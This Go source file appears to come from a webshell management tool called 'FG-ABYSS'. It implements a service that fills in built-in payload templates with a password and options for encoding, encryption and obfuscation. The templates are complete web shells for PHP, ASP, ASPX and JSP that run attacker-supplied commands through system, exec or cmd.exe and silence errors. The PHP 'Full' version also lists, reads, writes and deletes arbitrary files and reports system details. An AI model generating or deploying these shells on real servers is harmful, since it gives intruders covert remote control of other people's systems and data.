package services

import (
	"fg-abyss/internal/domain/entity"
	"fmt"
	"strings"
	"text/template"
)

// PayloadTemplateService Payload 模板服务
type PayloadTemplateService struct {
	templates map[string]*entity.PayloadTemplate
}

// NewPayloadTemplateService 创建模板服务
func NewPayloadTemplateService() *PayloadTemplateService {
	service := &PayloadTemplateService{
		templates: make(map[string]*entity.PayloadTemplate),
	}
	
	// 加载内置模板
	service.loadBuiltinTemplates()
	
	return service
}

// loadBuiltinTemplates 加载内置模板
func (s *PayloadTemplateService) loadBuiltinTemplates() {
	// PHP 基础版本
	s.AddTemplate(&entity.PayloadTemplate{
		Name:        "PHP Basic",
		Description: "PHP 基础版本 - 仅支持命令执行",
		Type:        entity.PayloadTypePHP,
		Function:    entity.PayloadFunctionBasic,
		Content:     phpBasicTemplate,
		IsBuiltin:   true,
		Parameters: []entity.TemplateParameter{
			{Name: "password", Description: "连接密码", Type: "string", Required: true, Default: "pass"},
		},
	})
	
	// PHP 完整版本
	s.AddTemplate(&entity.PayloadTemplate{
		Name:        "PHP Full",
		Description: "PHP 完整版本 - 支持所有功能",
		Type:        entity.PayloadTypePHP,
		Function:    entity.PayloadFunctionFull,
		Content:     phpFullTemplate,
		IsBuiltin:   true,
		Parameters: []entity.TemplateParameter{
			{Name: "password", Description: "连接密码", Type: "string", Required: true, Default: "pass"},
		},
	})
	
	// ASP 基础版本
	s.AddTemplate(&entity.PayloadTemplate{
		Name:        "ASP Basic",
		Description: "ASP 基础版本",
		Type:        entity.PayloadTypeASP,
		Function:    entity.PayloadFunctionBasic,
		Content:     aspBasicTemplate,
		IsBuiltin:   true,
		Parameters: []entity.TemplateParameter{
			{Name: "password", Description: "连接密码", Type: "string", Required: true, Default: "pass"},
		},
	})
	
	// ASPX 基础版本
	s.AddTemplate(&entity.PayloadTemplate{
		Name:        "ASPX Basic",
		Description: "ASPX 基础版本",
		Type:        entity.PayloadTypeASPX,
		Function:    entity.PayloadFunctionBasic,
		Content:     aspxBasicTemplate,
		IsBuiltin:   true,
		Parameters: []entity.TemplateParameter{
			{Name: "password", Description: "连接密码", Type: "string", Required: true, Default: "pass"},
		},
	})
	
	// JSP 基础版本
	s.AddTemplate(&entity.PayloadTemplate{
		Name:        "JSP Basic",
		Description: "JSP 基础版本",
		Type:        entity.PayloadTypeJSP,
		Function:    entity.PayloadFunctionBasic,
		Content:     jspBasicTemplate,
		IsBuiltin:   true,
		Parameters: []entity.TemplateParameter{
			{Name: "password", Description: "连接密码", Type: "string", Required: true, Default: "pass"},
		},
	})
}

// GetTemplate 获取模板
func (s *PayloadTemplateService) GetTemplate(name string) (*entity.PayloadTemplate, error) {
	tmpl, exists := s.templates[name]
	if !exists {
		return nil, ErrTemplateNotFound
	}
	return tmpl, nil
}

// GetTemplatesByType 按类型获取模板
func (s *PayloadTemplateService) GetTemplatesByType(payloadType entity.PayloadType) []*entity.PayloadTemplate {
	var result []*entity.PayloadTemplate
	for _, tmpl := range s.templates {
		if tmpl.Type == payloadType {
			result = append(result, tmpl)
		}
	}
	return result
}

// GetTemplatesByFunction 按功能获取模板
func (s *PayloadTemplateService) GetTemplatesByFunction(function entity.PayloadFunction) []*entity.PayloadTemplate {
	var result []*entity.PayloadTemplate
	for _, tmpl := range s.templates {
		if tmpl.Function == function {
			result = append(result, tmpl)
		}
	}
	return result
}

// GetAllTemplates 获取所有模板
func (s *PayloadTemplateService) GetAllTemplates() []*entity.PayloadTemplate {
	result := make([]*entity.PayloadTemplate, 0, len(s.templates))
	for _, tmpl := range s.templates {
		result = append(result, tmpl)
	}
	return result
}

// AddTemplate 添加模板
func (s *PayloadTemplateService) AddTemplate(tmpl *entity.PayloadTemplate) {
	s.templates[tmpl.Name] = tmpl
}

// RemoveTemplate 移除模板
func (s *PayloadTemplateService) RemoveTemplate(name string) error {
	if _, exists := s.templates[name]; !exists {
		return ErrTemplateNotFound
	}
	delete(s.templates, name)
	return nil
}

// RenderTemplate 渲染模板
func (s *PayloadTemplateService) RenderTemplate(tmplName string, config *entity.PayloadConfig) (string, error) {
	tmpl, err := s.GetTemplate(tmplName)
	if err != nil {
		return "", err
	}
	
	// 创建模板参数 - 使用更清晰的参数名
	data := map[string]interface{}{
		"Password":        config.Password,
		"password":        config.Password,
		"Encoder":         config.Encoder,
		"encoder":         config.Encoder,
		"EncryptionKey":   config.EncryptionKey,
		"encryptionKey":   config.EncryptionKey,
		"Obfuscation":     config.ObfuscationLevel,
		"obfuscation":     config.ObfuscationLevel,
		"Function":        config.Function,
		"function":        config.Function,
	}
	
	// 添加额外选项
	for k, v := range config.Options {
		data[k] = v
	}
	
	// 渲染模板
	t, err := template.New("payload").Parse(tmpl.Content)
	if err != nil {
		return "", fmt.Errorf("parse template failed: %w", err)
	}
	
	var builder strings.Builder
	err = t.Execute(&builder, data)
	if err != nil {
		return "", fmt.Errorf("execute template failed: %w", err)
	}
	
	return builder.String(), nil
}

// 内置模板内容

const phpBasicTemplate = `<?php
// FG-ABYSS PHP Basic Payload
// Password: {{.Password}}

error_reporting(0);
set_time_limit(0);

if (isset($_POST['{{.Password}}'])) {
    $command = $_POST['{{.Password}}'];
    if (function_exists('system')) {
        @system($command);
    } elseif (function_exists('exec')) {
        @exec($command, $output);
        echo implode("\n", $output);
    } elseif (function_exists('shell_exec')) {
        echo @shell_exec($command);
    } elseif (function_exists('passthru')) {
        @passthru($command);
    }
}
?>`

const phpFullTemplate = `<?php
// FG-ABYSS PHP Full Payload
// Password: {{.Password}}
// Features: Command, File, Database, System Info

error_reporting(0);
set_time_limit(0);
ini_set('max_execution_time', 0);

class Shell {
    private $password = '{{.Password}}';
    
    public function __construct() {
        if (isset($_POST[$this->password])) {
            $this->handle();
        }
    }
    
    private function handle() {
        $action = isset($_POST['action']) ? $_POST['action'] : 'exec';
        
        switch ($action) {
            case 'exec':
                $this->executeCommand();
                break;
            case 'file_list':
                $this->listFiles();
                break;
            case 'file_read':
                $this->readFile();
                break;
            case 'file_write':
                $this->writeFile();
                break;
            case 'file_delete':
                $this->deleteFile();
                break;
            case 'system_info':
                $this->getSystemInfo();
                break;
            default:
                $this->executeCommand();
        }
    }
    
    private function executeCommand() {
        $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
        if (empty($cmd)) {
            echo 'ERROR: No command specified';
            return;
        }
        
        $output = '';
        if (function_exists('system')) {
            @system($cmd);
        } elseif (function_exists('exec')) {
            @exec($cmd, $lines);
            $output = implode("\n", $lines);
            echo $output;
        } elseif (function_exists('shell_exec')) {
            echo @shell_exec($cmd);
        } elseif (function_exists('passthru')) {
            @passthru($cmd);
        } else {
            echo 'ERROR: No execution function available';
        }
    }
    
    private function listFiles() {
        $path = isset($_POST['path']) ? $_POST['path'] : '.';
        $files = @scandir($path);
        if ($files === false) {
            echo 'ERROR: Cannot list directory';
            return;
        }
        
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            $fullPath = $path . DIRECTORY_SEPARATOR . $file;
            $isDir = is_dir($fullPath) ? 'D' : 'F';
            $size = is_file($fullPath) ? filesize($fullPath) : 0;
            $mtime = filemtime($fullPath);
            echo "{$isDir}|{$file}|{$size}|{$mtime}\n";
        }
    }
    
    private function readFile() {
        $path = isset($_POST['path']) ? $_POST['path'] : '';
        if (empty($path)) {
            echo 'ERROR: No path specified';
            return;
        }
        
        $content = @file_get_contents($path);
        if ($content === false) {
            echo 'ERROR: Cannot read file';
            return;
        }
        echo $content;
    }
    
    private function writeFile() {
        $path = isset($_POST['path']) ? $_POST['path'] : '';
        $content = isset($_POST['content']) ? $_POST['content'] : '';
        
        if (empty($path)) {
            echo 'ERROR: No path specified';
            return;
        }
        
        $result = @file_put_contents($path, $content);
        if ($result === false) {
            echo 'ERROR: Cannot write file';
            return;
        }
        echo 'SUCCESS';
    }
    
    private function deleteFile() {
        $path = isset($_POST['path']) ? $_POST['path'] : '';
        if (empty($path)) {
            echo 'ERROR: No path specified';
            return;
        }
        
        if (@unlink($path)) {
            echo 'SUCCESS';
        } else {
            echo 'ERROR: Cannot delete file';
        }
    }
    
    private function getSystemInfo() {
        echo "OS: " . PHP_OS . "\n";
        echo "PHP Version: " . phpversion() . "\n";
        echo "Server: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
        echo "User: " . @get_current_user() . "\n";
        echo "Pwd: " . getcwd() . "\n";
    }
}

new Shell();
?>`

const aspBasicTemplate = `<%
' FG-ABYSS ASP Basic Payload
' Password: {{.Password}}

On Error Resume Next
Dim cmd, shell
cmd = Request.Form("{{.Password}}")

If cmd <> "" Then
    Set shell = Server.CreateObject("WScript.Shell")
    If Err.Number <> 0 Then
        Response.Write "ERROR: " & Err.Description
        Err.Clear
    Else
        Dim exec
        Set exec = shell.Exec("cmd.exe /c " & cmd)
        Response.Write exec.StdOut.ReadAll()
    End If
End If
%>`

const aspxBasicTemplate = `<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<%
// FG-ABYSS ASPX Basic Payload
// Password: {{.Password}}

string password = "{{.Password}}";
string cmd = Request.Form[password];

if (!string.IsNullOrEmpty(cmd))
{
    try
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        
        Process process = Process.Start(psi);
        string output = process.StandardOutput.ReadToEnd();
        Response.Write(output);
    }
    catch (Exception ex)
    {
        Response.Write("ERROR: " + ex.Message);
    }
}
%>`

const jspBasicTemplate = `<%@ page import="java.io.*" %>
<%
// FG-ABYSS JSP Basic Payload
// Password: {{.Password}}

String password = "{{.Password}}";
String cmd = request.getParameter(password);

if (cmd != null && !cmd.isEmpty()) {
    try {
        ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", cmd);
        pb.redirectErrorStream(true);
        Process process = pb.start();
        
        InputStream is = process.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
        String line;
        
        while ((line = reader.readLine()) != null) {
            out.println(line);
        }
        
        process.waitFor();
        is.close();
        reader.close();
    } catch (Exception e) {
        out.println("ERROR: " + e.getMessage());
    }
}
%>`
